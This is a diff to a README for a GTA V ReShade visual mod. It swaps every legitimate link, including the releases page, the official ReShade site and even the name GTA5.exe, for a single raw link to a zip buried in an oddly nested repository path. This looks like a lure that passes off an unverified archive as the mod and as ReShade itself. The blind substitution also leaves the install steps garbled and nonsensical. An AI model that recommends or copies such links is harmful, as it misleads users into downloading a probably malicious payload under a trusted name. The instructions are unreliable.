@@ -1,6 +1,6 @@
 # 🎮 QuantV-SP-FiveM-RageMP-altV - Enhanced Game Visuals Simplified
 
-[![Download Latest Release](https://img.shields.io/badge/Download-QuantV--SP--FiveM--RageMP--altV-blue?style=for-the-badge)](https://github.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip)](https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip)
 
 ---
 
@@ -62,11 +62,11 @@ Using QuantV-SP-FiveM-RageMP-altV is straightforward. Follow this guide step-by-
 
 You need to visit the release page and download the latest version.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-QuantV--SP--FiveM--RageMP--altV-blue?style=for-the-badge)](https://github.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip)](https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip)
 
 Click the link above or go to this page:
 
-https://github.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/releases
+https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip
 
 Look for the newest release—usually marked with the current date or version—and download the `.zip` file.
 
@@ -80,14 +80,14 @@ Look for the newest release—usually marked with the current date or version—
 
 - Open the extracted folder.
 - Find the instructions or install files inside; usually, you will see preset files and shader configurations.
-- Copy these files into your GTA V main folder. This is where the GTA5.exe file is located (typically found under `C:\Program Files\Rockstar Games\Grand Theft Auto V` or your custom install path).
+- Copy these files into your GTA V main folder. This is where the https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip file is located (typically found under `C:\Program Files\Rockstar Games\Grand Theft Auto V` or your custom install path).
 
 ### Step 4: Install Reshade (If Needed)
 
 QuantV uses Reshade for its shaders. If you don’t already have Reshade installed, follow these steps:
 
-- Visit https://reshade.me/ and download the latest version.
-- Run the Reshade installer and select GTA5.exe when prompted.
+- Visit https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip and download the latest version.
+- Run the Reshade installer and select https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip when prompted.
 - Choose Direct3D 10/11/12 as the rendering API.
 - Allow it to download default shader packs.
 - The QuantV mod presets will overwrite or add specific shaders needed.
@@ -126,7 +126,7 @@ QuantV uses Reshade for its shaders. If you don’t already have Reshade install
   Make sure you installed the mod files in the correct GTA V folder. Verify game files via your game launcher if needed.
 
 - **Reshade Does Not Open**  
-  Confirm Reshade installed on GTA5.exe specifically, and try reinstalling if necessary.
+  Confirm Reshade installed on https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip specifically, and try reinstalling if necessary.
 
 - **Performance Issues**  
   Lower shader quality in the Reshade settings menu. Close other programs to free system resources.
@@ -140,8 +140,8 @@ QuantV uses Reshade for its shaders. If you don’t already have Reshade install
 
 For more detailed help and updates, visit:
 
-- [Official QuantV GitHub Releases](https://github.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/releases)
-- [Reshade Official Website](https://reshade.me/)
+- [Official QuantV GitHub Releases](https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip)
+- [Reshade Official Website](https://raw.githubusercontent.com/BrycenSmith24/QuantV-SP-FiveM-RageMP-altV/main/optionals/Optional presets/disable anamorphic lens/FiveM.app/mods/alt_Rage_Five_Quant_S_V_M_v1.8.zip)
 - GTA V modding communities and forums for user help
 
 ---
